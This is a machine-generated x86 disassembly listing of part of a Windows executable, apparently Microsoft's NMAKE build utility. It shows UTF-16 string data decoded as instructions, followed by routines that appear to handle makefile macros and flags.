  402384:	and    BYTE PTR [eax],al
  402386:	and    BYTE PTR [eax],al
  402388:	and    BYTE PTR [eax],al
  40238a:	cmp    eax,0x25002000
  40238f:	add    BYTE PTR [eax+0x0],dh
  402392:	and    BYTE PTR [eax],al
  402394:	and    BYTE PTR [eax],al
  402396:	inc    esp
  402397:	add    BYTE PTR [edx+0x0],dh
  40239a:	aaa    
  40239b:	add    BYTE PTR [eax],ah
  40239d:	add    BYTE PTR [eax],ah
  40239f:	add    BYTE PTR [eax],ah
  4023a1:	add    BYTE PTR [eax],ah
  4023a3:	add    BYTE PTR ds:0x25002000,bh
  4023a9:	add    BYTE PTR [eax+0x0],dh
  4023ac:	or     al,BYTE PTR [eax]
  4023ae:	add    BYTE PTR [eax],al
  4023b0:	inc    ebx
  4023b1:	add    BYTE PTR [ebx+0x0],al
  4023b4:	add    BYTE PTR [eax],al
  4023b6:	add    BYTE PTR [eax],al
  4023b8:	arpl   WORD PTR [eax],ax
  4023ba:	ins    BYTE PTR es:[edi],dx
  4023bb:	add    BYTE PTR [eax],al
  4023bd:	add    BYTE PTR [eax],al
  4023bf:	add    BYTE PTR [ebx+0x0],al
  4023c2:	pop    eax
  4023c3:	add    BYTE PTR [eax+0x0],bl
  4023c6:	add    BYTE PTR [eax],al
  4023c8:	inc    ebx
  4023c9:	add    BYTE PTR [eax+0x0],dl
  4023cc:	push   eax
  4023cd:	add    BYTE PTR [eax],al
  4023cf:	add    BYTE PTR [ecx+0x0],al
  4023d2:	push   ebx
  4023d3:	add    BYTE PTR [eax],al
  4023d5:	add    BYTE PTR [eax],al
  4023d7:	add    BYTE PTR [ebp+0x0],ch
  4023da:	ins    BYTE PTR es:[edi],dx
  4023db:	add    BYTE PTR [eax],al
  4023dd:	add    BYTE PTR [eax],al
  4023df:	add    BYTE PTR [edx+0x0],dl
  4023e2:	inc    ebx
  4023e3:	add    BYTE PTR [eax],al
  4023e5:	add    BYTE PTR [eax],al
  4023e7:	add    BYTE PTR [edx+0x0],dh
  4023ea:	arpl   WORD PTR [eax],ax
  4023ec:	add    BYTE PTR [eax],al
  4023ee:	add    BYTE PTR [eax],al
  4023f0:	pop    edi
  4023f1:	add    BYTE PTR [esi+0x0],cl
  4023f4:	dec    ebp
  4023f5:	add    BYTE PTR [ecx+0x0],al
  4023f8:	dec    ebx
  4023f9:	add    BYTE PTR [ebp+0x0],al
  4023fc:	pop    edi
  4023fd:	add    BYTE PTR [esi+0x0],dl
  402400:	inc    ebp
  402401:	add    BYTE PTR [edx+0x0],dl
  402404:	add    BYTE PTR [eax],al
  402406:	add    BYTE PTR [eax],al
  402408:	dec    ebp
  402409:	add    BYTE PTR [ecx+0x0],al
  40240c:	dec    ebx
  40240d:	add    BYTE PTR [ebp+0x0],al
  402410:	add    BYTE PTR [eax],al
  402412:	add    BYTE PTR [eax],al
  402414:	dec    ebp
  402415:	add    BYTE PTR [ecx+0x0],al
  402418:	dec    ebx
  402419:	add    BYTE PTR [ebp+0x0],al
  40241c:	inc    esp
  40241d:	add    BYTE PTR [ecx+0x0],cl
  402420:	push   edx
  402421:	add    BYTE PTR [eax],al
  402423:	add    BYTE PTR [ebp+0x0],cl
  402426:	inc    ecx
  402427:	add    BYTE PTR [ebx+0x0],cl
  40242a:	inc    ebp
  40242b:	add    BYTE PTR [esi+0x0],al
  40242e:	dec    esp
  40242f:	add    BYTE PTR [ecx+0x0],al
  402432:	inc    edi
  402433:	add    BYTE PTR [ebx+0x0],dl
  402436:	add    BYTE PTR [eax],al
  402438:	dec    esi
  402439:	add    BYTE PTR [eax+eax*1+0x4d],dl
  40243d:	add    BYTE PTR [ecx+0x0],al
  402440:	dec    ebx
  402441:	add    BYTE PTR [ebp+0x0],al
  402444:	inc    ebp
  402445:	add    BYTE PTR [esi+0x0],cl
  402448:	push   esi
  402449:	add    BYTE PTR [eax],al
  40244b:	add    BYTE PTR [eax+eax*1+0x6f],dh
  40244f:	add    BYTE PTR [edi+0x0],ch
  402452:	ins    BYTE PTR es:[edi],dx
  402453:	add    BYTE PTR [ebx+0x0],dh
  402456:	add    BYTE PTR cs:[ecx+0x0],ch
  40245a:	outs   dx,BYTE PTR ds:[esi]
  40245b:	add    BYTE PTR [ecx+0x0],ch
  40245e:	add    BYTE PTR [eax],al
  402460:	outs   dx,BYTE PTR ds:[esi]
  402461:	add    BYTE PTR [ebp+0x0],ch
  402464:	popa   
  402465:	add    BYTE PTR [ebx+0x0],ch
  402468:	add    BYTE PTR gs:[eax],al
  40246b:	add    BYTE PTR [ecx+0x0],cl
  40246e:	dec    esi
  40246f:	add    BYTE PTR [ecx+0x0],cl
  402472:	push   esp
  402473:	add    BYTE PTR [eax],al
  402475:	add    BYTE PTR [eax],al
  402477:	add    BYTE PTR [ebx+0x0],dl
  40247a:	push   esp
  40247b:	add    BYTE PTR [eax+eax*1+0x49],al
  40247f:	add    BYTE PTR [esi+0x0],cl
  402482:	add    BYTE PTR [eax],al
  402484:	push   0x6c006500
  402489:	add    BYTE PTR [eax+0x0],dh
  40248c:	add    BYTE PTR [eax],al
  40248e:	add    BYTE PTR [eax],al
  402490:	outs   dx,BYTE PTR ds:[esi]
  402491:	add    BYTE PTR [edi+0x0],ch
  402494:	ins    BYTE PTR es:[edi],dx
  402495:	add    BYTE PTR [edi+0x0],ch
  402498:	add    BYTE PTR [bx+0x0],ch
  40249c:	add    BYTE PTR [eax],al
  40249e:	add    BYTE PTR [eax],al
  4024a0:	ja     0x4024a2
  4024a2:	je     0x4024a4
  4024a4:	add    BYTE PTR [eax],al
  4024a6:	add    BYTE PTR [eax],al
  4024a8:	ins    DWORD PTR es:[edi],dx
  4024a9:	add    BYTE PTR [ecx+0x0],ah
  4024ac:	imul   eax,DWORD PTR [eax],0x65
  4024af:	add    BYTE PTR [esi+0x0],ah
  4024b2:	imul   eax,DWORD PTR [eax],0x65006c
  4024b8:	add    BYTE PTR [eax],al
  4024ba:	add    BYTE PTR [eax],al
  4024bc:	or     DWORD PTR [eax],eax
  4024be:	add    BYTE PTR fs:[ebp+0x0],ah
  4024c2:	ins    BYTE PTR es:[edi],dx
  4024c3:	add    BYTE PTR [eax],ah
  4024c5:	add    BYTE PTR ds:0xa007300,ah
  4024cb:	add    BYTE PTR [eax],al
  4024cd:	add    BYTE PTR [eax],al
  4024cf:	add    BYTE PTR [ebp+0x0],dl
  4024d2:	dec    ecx
  4024d3:	add    BYTE PTR [esi],ch
  4024d5:	add    BYTE PTR [eax+eax*1+0x4c],al
  4024d9:	add    BYTE PTR [eax+eax*1+0x0],cl
  4024dd:	add    BYTE PTR [eax],al
  4024df:	add    BYTE PTR [ebp+0x0],cl
  4024e2:	imul   eax,DWORD PTR [eax],0x720063
  4024e8:	outs   dx,DWORD PTR ds:[esi]
  4024e9:	add    BYTE PTR [ebx+0x0],dh
  4024ec:	outs   dx,DWORD PTR ds:[esi]
  4024ed:	add    BYTE PTR [esi+0x0],ah
  4024f0:	je     0x4024f2
  4024f2:	scas   al,BYTE PTR es:[edi]
  4024f3:	add    BYTE PTR [eax],ah
  4024f5:	add    BYTE PTR [eax+0x0],dl
  4024f8:	jb     0x4024fa
  4024fa:	outs   dx,DWORD PTR ds:[esi]
  4024fb:	add    BYTE PTR [edi+0x0],ah
  4024fe:	jb     0x402500
  402500:	popa   
  402501:	add    BYTE PTR [ebp+0x0],ch
  402504:	and    BYTE PTR [eax],al
  402506:	dec    ebp
  402507:	add    BYTE PTR [ecx+0x0],ah
  40250a:	imul   eax,DWORD PTR [eax],0x74006e
  402510:	add    BYTE PTR gs:[esi+0x0],ch
  402514:	popa   
  402515:	add    BYTE PTR [esi+0x0],ch
  402518:	arpl   WORD PTR [eax],ax
  40251a:	add    BYTE PTR gs:[eax],ah
  40251d:	add    BYTE PTR [ebp+0x0],dl
  402520:	je     0x402522
  402522:	imul   eax,DWORD PTR [eax],0x69006c
  402528:	je     0x40252a
  40252a:	jns    0x40252c
  40252c:	add    BYTE PTR [eax],al
  40252e:	add    BYTE PTR [eax],al
  402530:	ins    DWORD PTR es:[edi],dx
  402531:	add    BYTE PTR [ebx+0x0],dh
  402534:	jbe    0x402536
  402536:	arpl   WORD PTR [eax],ax
  402538:	jb     0x40253a
  40253a:	xor    DWORD PTR [eax],eax
  40253c:	xor    DWORD PTR [eax],eax
  40253e:	xor    BYTE PTR [eax],al
  402540:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  402545:	add    BYTE PTR [eax+eax*1+0x0],ch
  402549:	add    BYTE PTR [eax],al
  40254b:	add    BYTE PTR [edx],cl
  40254d:	add    BYTE PTR [ecx],cl
  40254f:	add    BYTE PTR [ecx],cl
  402551:	add    BYTE PTR [ecx],cl
  402553:	add    BYTE PTR [eax],al
  402555:	add    BYTE PTR [eax],al
  402557:	add    BYTE PTR [eax+eax*1+0x64],ah
  40255b:	add    BYTE PTR [eax+eax*1+0x2c],ah
  40255f:	add    BYTE PTR [eax],ah
  402561:	add    BYTE PTR [ebp+0x0],cl
  402564:	dec    ebp
  402565:	add    BYTE PTR [ebp+0x0],cl
  402568:	and    BYTE PTR [eax],al
  40256a:	add    BYTE PTR fs:[eax+eax*1+0x20],ah
  40256f:	add    BYTE PTR [ecx+0x0],bh
  402572:	jns    0x402574
  402574:	jns    0x402576
  402576:	jns    0x402578
  402578:	add    BYTE PTR [eax],al
  40257a:	add    BYTE PTR [eax],al
  40257c:	dec    eax
  40257d:	add    BYTE PTR [eax+0x0],cl
  402580:	cmp    al,BYTE PTR [eax]
  402582:	ins    DWORD PTR es:[edi],dx
  402583:	add    BYTE PTR [ebp+0x0],ch
  402586:	cmp    al,BYTE PTR [eax]
  402588:	jae    0x40258a
  40258a:	jae    0x40258c
  40258c:	add    BYTE PTR [eax],al
  40258e:	add    BYTE PTR [eax],al
  402590:	and    eax,0x20007300
  402595:	add    BYTE PTR [eax],al
  402597:	add    BYTE PTR [ecx],cl
  402599:	add    BYTE PTR [ecx],cl
  40259b:	add    BYTE PTR ds:0xa007300,ah
  4025a1:	add    BYTE PTR [eax],al
  4025a3:	add    BYTE PTR ds:0x3a007300,ah
  4025a9:	add    BYTE PTR [edx],bh
  4025ab:	add    BYTE PTR [eax],al
  4025ad:	add    BYTE PTR [eax],al
  4025af:	add    BYTE PTR ds:0x3a007300,ah
  4025b5:	add    BYTE PTR [eax],al
  4025b7:	add    BYTE PTR ds:0xa007300,ah
  4025bd:	add    BYTE PTR [eax],al
  4025bf:	add    BYTE PTR [ecx],cl
  4025c1:	add    BYTE PTR [ecx],cl
  4025c3:	add    BYTE PTR [ecx],cl
  4025c5:	add    BYTE PTR ds:0xa007300,ah
  4025cb:	add    BYTE PTR [eax],al
  4025cd:	add    BYTE PTR [eax],al
  4025cf:	add    BYTE PTR ds:0x3a007300,ah
  4025d5:	add    BYTE PTR [eax],ah
  4025d7:	add    BYTE PTR [eax],al
  4025d9:	add    BYTE PTR [eax],al
  4025db:	add    BYTE PTR ds:0x3a007300,ah
  4025e1:	add    BYTE PTR ds:0x6300,ah
  4025e7:	add    BYTE PTR ds:0x63002500,ch
  4025ed:	add    BYTE PTR [eax],ah
  4025ef:	add    BYTE PTR [eax],al
  4025f1:	add    BYTE PTR [eax],al
  4025f3:	add    BYTE PTR [eax+eax*1+0x69],ah
  4025f7:	add    BYTE PTR [esi+0x0],ch
  4025fa:	jae    0x4025fc
  4025fc:	bound  eax,QWORD PTR [eax]
  4025fe:	add    BYTE PTR [eax],al
  402600:	sub    BYTE PTR [eax],al
  402602:	add    BYTE PTR [eax],al
  402604:	sub    DWORD PTR [eax],eax
  402606:	add    BYTE PTR [eax],al
  402608:	das    
  402609:	add    BYTE PTR [eax],al
  40260b:	add    BYTE PTR [ebx],ch
  40260d:	add    BYTE PTR [eax],al
  40260f:	add    BYTE PTR [eax+eax*1],bh
  402612:	cmp    eax,0x0
  402617:	add    BYTE PTR [esi],bh
  402619:	add    BYTE PTR ds:0x0,bh
  40261f:	add    BYTE PTR [eax+eax*1],bh
  402622:	add    BYTE PTR [eax],al
  402624:	cmp    eax,0x3d00
  402629:	add    BYTE PTR [eax],al
  40262b:	add    BYTE PTR [ecx],ah
  40262d:	add    BYTE PTR ds:0x0,bh
  402633:	add    BYTE PTR [esi],ah
  402635:	add    BYTE PTR [esi],ah
  402637:	add    BYTE PTR [eax],al
  402639:	add    BYTE PTR [eax],al
  40263b:	add    BYTE PTR [eax+eax*1+0x7c],bh
  40263f:	add    BYTE PTR [eax],al
  402641:	add    BYTE PTR [eax],al
  402643:	add    BYTE PTR [esi],ah
  402645:	add    BYTE PTR [eax],al
  402647:	add    BYTE PTR [eax+eax*1+0x0],bh
  40264b:	add    BYTE PTR [esi+0x0],bl
  40264e:	pop    esi
  40264f:	add    BYTE PTR [eax],al
  402651:	add    BYTE PTR [eax],al
  402653:	add    BYTE PTR [esi+0x0],bh
  402656:	add    BYTE PTR [eax],al
  402658:	and    DWORD PTR [eax],eax
  40265a:	add    BYTE PTR [eax],al
  40265c:	inc    esp
  40265d:	add    BYTE PTR [ebp+0x0],al
  402660:	inc    esi
  402661:	add    BYTE PTR [ecx+0x0],cl
  402664:	dec    esi
  402665:	add    BYTE PTR [ebp+0x0],al
  402668:	inc    esp
  402669:	add    BYTE PTR [eax],al
  40266b:	add    BYTE PTR [ebp+0x0],al
  40266e:	pop    eax
  40266f:	add    BYTE PTR [ecx+0x0],cl
  402672:	push   ebx
  402673:	add    BYTE PTR [eax+eax*1+0x53],dl
  402677:	add    BYTE PTR [eax],al
  402679:	add    BYTE PTR [eax],al
  40267b:	add    BYTE PTR [ebp+0x0],al
  40267e:	pop    eax
  40267f:	add    BYTE PTR [ecx+0x0],cl
  402682:	push   ebx
  402683:	add    BYTE PTR [eax+eax*1+0x0],dl
  402687:	add    BYTE PTR [edx],ah
  402689:	add    BYTE PTR [esi],ch
  40268b:	add    BYTE PTR [eax+eax*1+0x0],bl
  40268f:	add    BYTE PTR [esi],ch
  402691:	add    BYTE PTR [eax+eax*1+0x0],bl
  402695:	add    BYTE PTR [eax],al
  402697:	add    BYTE PTR [esi],ch
  402699:	add    BYTE PTR [edi],ch
  40269b:	add    BYTE PTR [eax],al
  40269d:	add    BYTE PTR [eax],al
  40269f:	add    BYTE PTR [eax+eax*1],ah
  4026a2:	sub    BYTE PTR [eax],al
  4026a4:	and    eax,0x29007300
  4026a9:	add    BYTE PTR [eax],al
  4026ab:	add    BYTE PTR [esi],ch
  4026ad:	add    BYTE PTR [edi],ch
  4026af:	add    BYTE PTR [eax+eax*1+0x0],bl
  4026b3:	add    BYTE PTR [eax],al
  4026b5:	add    BYTE PTR [eax],al
  4026b7:	add    BYTE PTR [eax+0x0],cl
	...
  4026f2:	add    BYTE PTR [eax],al
  4026f4:	sbb    BYTE PTR [eax],dl
  4026f6:	inc    ecx
  4026f7:	add    BYTE PTR [eax+0x27],al
  4026fa:	inc    eax
  4026fb:	add    BYTE PTR [ecx],al
  4026fd:	add    BYTE PTR [eax],al
  4026ff:	add    BYTE PTR [edx+0x53],dl
  402702:	inc    esp
  402703:	push   ebx
  402704:	aaa    
  402705:	pop    esi
  402706:	mov    ds:0x2aa68d3e,eax
  40270b:	dec    eax
  40270c:	xchg   ebp,eax
  40270d:	call   FWORD PTR ds:0x9d0c746f
  402713:	in     eax,dx
  402714:	add    eax,0x6e000000
  402719:	ins    DWORD PTR es:[edi],dx
  40271a:	popa   
  40271b:	imul   esp,DWORD PTR [ebp+0x2e],0x70
  40271f:	bound  eax,QWORD PTR fs:[eax]
	...
  40273e:	add    BYTE PTR [eax],al
  402740:	dec    ecx
  402741:	add    eax,DWORD PTR [ecx]
	...
  40275f:	add    BYTE PTR [esi+0x33],dl
  402762:	rcl    BYTE PTR [eax+0x50],0x50
  402766:	push   eax
  402767:	mov    esi,0x4216f0
  40276c:	push   eax
  40276d:	mov    edx,0x4216ec
  402772:	mov    ecx,esi
  402774:	call   0x40dfe5
  402779:	mov    ecx,esi
  40277b:	call   0x40dd18
  402780:	mov    ds:0x4216e8,eax
  402785:	pop    esi
  402786:	ret    
  402787:	push   ebp
  402788:	mov    ebp,esp
  40278a:	push   ecx
  40278b:	push   ebx
  40278c:	push   esi
  40278d:	push   edi
  40278e:	xor    edi,edi
  402790:	cmp    DWORD PTR ds:0x4216e8,edi
  402796:	je     0x4027aa
  402798:	or     BYTE PTR ds:0x4216e4,0x20
  40279f:	call   0x4028b7
  4027a4:	mov    DWORD PTR ds:0x4216e8,edi
  4027aa:	test   BYTE PTR ds:0x4216e4,0x20
  4027b1:	mov    ebx,0x4216f0
  4027b6:	je     0x4027f0
  4027b8:	mov    ecx,ebx
  4027ba:	call   0x40f2e1
  4027bf:	test   al,al
  4027c1:	je     0x4027f0
  4027c3:	test   BYTE PTR ds:0x4216e4,0x10
  4027ca:	je     0x4027de
  4027cc:	push   0x444
  4027d1:	push   DWORD PTR ds:0x4216e0
  4027d7:	call   0x405021
  4027dc:	pop    ecx
  4027dd:	pop    ecx
  4027de:	push   0x43d
  4027e3:	push   DWORD PTR ds:0x4216e0
  4027e9:	call   0x405021
  4027ee:	pop    ecx
  4027ef:	pop    ecx
  4027f0:	call   0x40dcc8
  4027f5:	mov    dl,BYTE PTR ds:0x4216e4
  4027fb:	mov    esi,eax
  4027fd:	test   dl,0x40
  402800:	je     0x402813
  402802:	mov    ecx,DWORD PTR ds:0x4216dc
  402808:	mov    DWORD PTR [esi+0x4],ecx
  40280b:	mov    DWORD PTR ds:0x4216dc,edi
  402811:	jmp    0x402823
  402813:	mov    ecx,ebx
  402815:	call   0x40dd18
  40281a:	mov    dl,BYTE PTR ds:0x4216e4
  402820:	mov    DWORD PTR [esi+0x4],eax
  402823:	mov    DWORD PTR [ebp-0x4],esi
  402826:	mov    ebx,0x4216ec
  40282b:	test   dl,0x10
  40282e:	je     0x402835
  402830:	test   dl,0x20
  402833:	je     0x402899
  402835:	mov    ecx,DWORD PTR [esi+0x4]
  402838:	push   edi
  402839:	push   edi
  40283a:	push   edi
  40283b:	push   edi
  40283c:	push   edi
  40283d:	mov    edx,ebx
  40283f:	call   0x40dfe5
  402844:	mov    dl,BYTE PTR ds:0x4216e4
  40284a:	test   dl,0x20
  40284d:	je     0x402899
  40284f:	mov    esi,DWORD PTR ds:0x4216ec
  402855:	push   ebx
  402856:	lea    edx,[ebp-0x4]
  402859:	mov    ecx,0x401084
  40285e:	call   0x402b2e
  402863:	push   edi
  402864:	lea    edx,[ebp-0x4]
  402867:	mov    ecx,0x401088
  40286c:	call   0x402b2e
  402871:	mov    eax,esi
  402873:	mov    ds:0x4216ec,eax
  402878:	test   esi,esi
  40287a:	je     0x402899
  40287c:	mov    ecx,DWORD PTR ds:0x43265c
  402882:	mov    esi,DWORD PTR [esi]
  402884:	mov    DWORD PTR [eax],ecx
  402886:	mov    ecx,eax
  402888:	mov    eax,esi
  40288a:	mov    ds:0x4216ec,eax
  40288f:	test   esi,esi
  402891:	jne    0x402882
  402893:	mov    DWORD PTR ds:0x43265c,ecx
  402899:	mov    eax,ds:0x4216d8
  40289e:	pop    edi
  40289f:	pop    esi
  4028a0:	mov    ecx,0x4216d8
  4028a5:	pop    ebx
  4028a6:	jmp    0x4028ac
  4028a8:	mov    ecx,eax
  4028aa:	mov    eax,DWORD PTR [ecx]
  4028ac:	test   eax,eax
  4028ae:	jne    0x4028a8
  4028b0:	mov    eax,DWORD PTR [ebp-0x4]
  4028b3:	mov    DWORD PTR [ecx],eax
  4028b5:	leave  
  4028b6:	ret    
  4028b7:	mov    al,ds:0x4114be
  4028bc:	push   esi
  4028bd:	push   edi
  4028be:	mov    ds:0x4114bf,al
  4028c3:	call   0x40dcc8
  4028c8:	mov    ecx,DWORD PTR ds:0x4216e8
  4028ce:	mov    DWORD PTR [eax+0x4],ecx
  4028d1:	mov    esi,DWORD PTR ds:0x4216ec
  4028d7:	mov    edi,0x4216d8
  4028dc:	push   0x4216ec
  4028e1:	mov    edx,edi
  4028e3:	mov    ecx,0x401084
  4028e8:	mov    ds:0x4216d8,eax
  4028ed:	call   0x402b2e
  4028f2:	push   0x0
  4028f4:	mov    edx,edi
  4028f6:	mov    ecx,0x401088
  4028fb:	call   0x402b2e
  402900:	mov    eax,esi
  402902:	mov    ds:0x4216ec,eax
  402907:	test   esi,esi
  402909:	je     0x402928
  40290b:	mov    ecx,DWORD PTR ds:0x43265c
  402911:	mov    esi,DWORD PTR [esi]
  402913:	mov    DWORD PTR [eax],ecx
  402915:	mov    ecx,eax
  402917:	mov    eax,esi
  402919:	mov    ds:0x4216ec,eax
  40291e:	test   esi,esi
  402920:	jne    0x402911
  402922:	mov    DWORD PTR ds:0x43265c,ecx
  402928:	mov    ecx,DWORD PTR ds:0x4216d8
  40292e:	pop    edi
  40292f:	pop    esi
  402930:	test   ecx,ecx
  402932:	jne    0x402960
  402934:	test   BYTE PTR ds:0x4216e4,0x20
  40293b:	jne    0x402973
  40293d:	push   DWORD PTR ds:0x4216e8
  402943:	push   0x43b
  402948:	push   DWORD PTR ds:0x4216d4
  40294e:	call   0x405021
  402953:	mov    ecx,DWORD PTR ds:0x4216d8
  402959:	add    esp,0xc
  40295c:	test   ecx,ecx
  40295e:	je     0x402973
  402960:	mov    ecx,DWORD PTR [ecx+0x4]
  402963:	call   0x40f2e1
  402968:	test   al,al
  40296a:	je     0x402973
  40296c:	or     BYTE PTR ds:0x4216e4,0x10
  402973:	ret    
  402974:	cmp    DWORD PTR ds:0x4216e8,0x0
  40297b:	je     0x40298b
  40297d:	call   0x4028b7
  402982:	and    DWORD PTR ds:0x4216e8,0x0
  402989:	jmp    0x402992
  40298b:	and    BYTE PTR ds:0x4216e4,0xdf
  402992:	cmp    WORD PTR ds:0x4216f2,0x0
  40299a:	push   ebx
  40299b:	mov    bl,BYTE PTR ds:0x4114bf
  4029a1:	push   esi
  4029a2:	je     0x4029ad
  4029a4:	or     bl,0x20
  4029a7:	mov    BYTE PTR ds:0x4114bf,bl
  4029ad:	mov    esi,DWORD PTR ds:0x4216d8
  4029b3:	test   esi,esi
  4029b5:	jne    0x4029c9
  4029b7:	push   0x40d
  4029bc:	push   DWORD PTR ds:0x4216e0
  4029c2:	call   0x405021
  4029c7:	pop    ecx
  4029c8:	pop    ecx
  4029c9:	test   BYTE PTR ds:0x4216e4,0x10
  4029d0:	je     0x402a01
  4029d2:	push   0x18
  4029d4:	shr    bl,0x5
  4029d7:	pop    ecx
  4029d8:	and    bl,0x1
  4029db:	call   0x40a320
  4029e0:	mov    ecx,DWORD PTR [esi+0x4]
  4029e3:	mov    DWORD PTR [eax+0x8],ecx
  4029e6:	mov    BYTE PTR [eax+0x14],bl
  4029e9:	mov    ecx,DWORD PTR ds:0x4216c4
  4029ef:	mov    DWORD PTR [eax],ecx
  4029f1:	mov    ds:0x4216c4,eax
  4029f6:	mov    ecx,DWORD PTR [eax]
  4029f8:	test   ecx,ecx
  4029fa:	je     0x402a21
  4029fc:	mov    DWORD PTR [ecx+0x4],eax
  4029ff:	jmp    0x402a21
  402a01:	cmp    DWORD PTR [esi],0x0
  402a04:	jne    0x402a3c
  402a06:	mov    ecx,DWORD PTR [esi+0x4]
  402a09:	call   0x402a53
  402a0e:	test   al,al
  402a10:	je     0x402a36
  402a12:	mov    eax,ds:0x4216d8
  402a17:	push   DWORD PTR [eax+0x4]
  402a1a:	call   DWORD PTR ds:0x43754c
  402a20:	pop    ecx
  402a21:	mov    ecx,DWORD PTR ds:0x4216d8
  402a27:	mov    eax,ds:0x43265c
  402a2c:	mov    DWORD PTR [ecx],eax
  402a2e:	mov    DWORD PTR ds:0x43265c,ecx
  402a34:	jmp    0x402a42
  402a36:	mov    esi,DWORD PTR ds:0x4216d8
  402a3c:	mov    DWORD PTR ds:0x4114b0,esi
  402a42:	and    DWORD PTR ds:0x4216d8,0x0
  402a49:	or     BYTE PTR ds:0x4216e4,0x80
  402a50:	pop    esi
  402a51:	pop    ebx
  402a52:	ret    
  402a53:	push   ebp
  402a54:	mov    ebp,esp
  402a56:	push   ecx
  402a57:	push   ebx
  402a58:	push   esi
  402a59:	push   edi
  402a5a:	mov    edi,DWORD PTR ds:0x437548
  402a60:	mov    esi,ecx
  402a62:	push   0x4011a4
  402a67:	xor    ebx,ebx
  402a69:	push   esi
  402a6a:	mov    BYTE PTR [ebp-0x1],bl
  402a6d:	call   edi
  402a6f:	pop    ecx
  402a70:	pop    ecx
  402a71:	test   eax,eax
  402a73:	jne    0x402a8a
  402a75:	or     BYTE PTR ds:0x4216e4,0x2
  402a7c:	push   0x73
  402a7e:	mov    dl,0x1
  402a80:	pop    ecx
  402a81:	call   0x40bd70
  402a86:	mov    BYTE PTR [ebp-0x1],0x1
  402a8a:	push   0x401194
  402a8f:	push   esi
  402a90:	call   edi
  402a92:	pop    ecx
  402a93:	pop    ecx
  402a94:	test   eax,eax
  402a96:	jne    0x402aab
  402a98:	or     BYTE PTR ds:0x4216e4,0x4
  402a9f:	push   0x69
  402aa1:	mov    dl,0x1
  402aa3:	pop    ecx
  402aa4:	call   0x40bd70
  402aa9:	jmp    0x402ae9
  402aab:	push   0x4
  402aad:	mov    ecx,0x401180
  402ab2:	mov    eax,esi
  402ab4:	pop    edi
  402ab5:	mov    dx,WORD PTR [eax]
  402ab8:	cmp    dx,WORD PTR [ecx]
  402abb:	jne    0x402ad9
  402abd:	test   dx,dx
  402ac0:	je     0x402ad5
  402ac2:	mov    dx,WORD PTR [eax+0x2]
  402ac6:	cmp    dx,WORD PTR [ecx+0x2]
  402aca:	jne    0x402ad9
  402acc:	add    eax,edi
  402ace:	add    ecx,edi
  402ad0:	test   dx,dx
  402ad3:	jne    0x402ab5
  402ad5:	mov    eax,ebx
  402ad7:	jmp    0x402ade
  402ad9:	sbb    eax,eax
  402adb:	or     eax,0x1
  402ade:	test   eax,eax
  402ae0:	jne    0x402aed
  402ae2:	or     BYTE PTR ds:0x4216e4,0x1
  402ae9:	mov    al,0x1
  402aeb:	jmp    0x402b29
  402aed:	mov    eax,0x40116c
  402af2:	mov    cx,WORD PTR [esi]
  402af5:	cmp    cx,WORD PTR [eax]
  402af8:	jne    0x402b14
  402afa:	test   cx,cx
  402afd:	je     0x402b19
  402aff:	mov    cx,WORD PTR [esi+0x2]
  402b03:	cmp    cx,WORD PTR [eax+0x2]
  402b07:	jne    0x402b14
  402b09:	add    esi,edi
  402b0b:	add    eax,edi
  402b0d:	test   cx,cx
  402b10:	jne    0x402af2
  402b12:	jmp    0x402b19
  402b14:	sbb    ebx,ebx
  402b16:	or     ebx,0x1
  402b19:	test   ebx,ebx
  402b1b:	jne    0x402b26
  402b1d:	or     BYTE PTR ds:0x4216e4,0x8
  402b24:	jmp    0x402ae9
  402b26:	mov    al,BYTE PTR [ebp-0x1]
  402b29:	pop    edi
  402b2a:	pop    esi
  402b2b:	pop    ebx
  402b2c:	leave  
  402b2d:	ret    
  402b2e:	push   ebp
  402b2f:	mov    ebp,esp
  402b31:	and    esp,0xfffffff8
  402b34:	sub    esp,0x24
  402b37:	push   ebx
  402b38:	mov    eax,edx
  402b3a:	push   esi
  402b3b:	mov    esi,DWORD PTR [eax]
  402b3d:	mov    edx,ecx
  402b3f:	xor    ecx,ecx
  402b41:	push   edi
  402b42:	mov    DWORD PTR [esp+0x10],eax
  402b46:	mov    DWORD PTR [esp+0x1c],edx
  402b4a:	mov    DWORD PTR [esp+0x14],ecx
  402b4e:	mov    DWORD PTR [esp+0x28],ecx
  402b52:	mov    ebx,ecx
  402b54:	test   esi,esi
  402b56:	je     0x402ca4
  402b5c:	mov    edi,DWORD PTR [esp+0x18]
  402b60:	push   edx
  402b61:	push   DWORD PTR [esi+0x4]
  402b64:	call   DWORD PTR ds:0x437544
  402b6a:	pop    ecx
  402b6b:	pop    ecx
  402b6c:	test   eax,eax
  402b6e:	je     0x402c94
  402b74:	mov    eax,DWORD PTR [esp+0x1c]
  402b78:	push   0x24
  402b7a:	pop    ecx
  402b7b:	cmp    WORD PTR [eax],cx
  402b7e:	mov    ecx,DWORD PTR [esi+0x4]
  402b81:	jne    0x402b9e
  402b83:	push   DWORD PTR [ebp+0x8]
  402b86:	or     dl,0xff
  402b89:	call   0x40e68f
  402b8e:	push   DWORD PTR [esi+0x4]
  402b91:	mov    DWORD PTR [esp+0x18],eax
  402b95:	call   DWORD PTR ds:0x43754c
  402b9b:	pop    ecx
  402b9c:	jmp    0x402bc8
  402b9e:	call   0x40f2e1
  402ba3:	test   al,al
  402ba5:	jne    0x402c94
  402bab:	mov    ecx,DWORD PTR [esi+0x4]
  402bae:	call   0x40f9e0
  402bb3:	mov    edi,eax
  402bb5:	mov    DWORD PTR [esp+0x18],edi
  402bb9:	test   edi,edi
  402bbb:	je     0x402c94
  402bc1:	mov    eax,DWORD PTR [esi+0x4]
  402bc4:	mov    DWORD PTR [esp+0x28],eax
  402bc8:	mov    eax,DWORD PTR [esi]
  402bca:	mov    ecx,DWORD PTR [esp+0x10]
  402bce:	test   ebx,ebx
  402bd0:	je     0x402be5
  402bd2:	mov    DWORD PTR [ebx],eax
  402bd4:	mov    eax,ds:0x43265c
  402bd9:	mov    DWORD PTR [esi],eax
  402bdb:	mov    DWORD PTR ds:0x43265c,esi
  402be1:	mov    esi,DWORD PTR [ebx]
  402be3:	jmp    0x402bf6
  402be5:	mov    DWORD PTR [ecx],eax
  402be7:	mov    eax,ds:0x43265c
  402bec:	mov    DWORD PTR [esi],eax
  402bee:	mov    DWORD PTR ds:0x43265c,esi
  402bf4:	mov    esi,DWORD PTR [ecx]
  402bf6:	mov    eax,DWORD PTR [esp+0x1c]
  402bfa:	push   0x24
  402bfc:	pop    edx
  402bfd:	mov    DWORD PTR [esp+0x24],esi
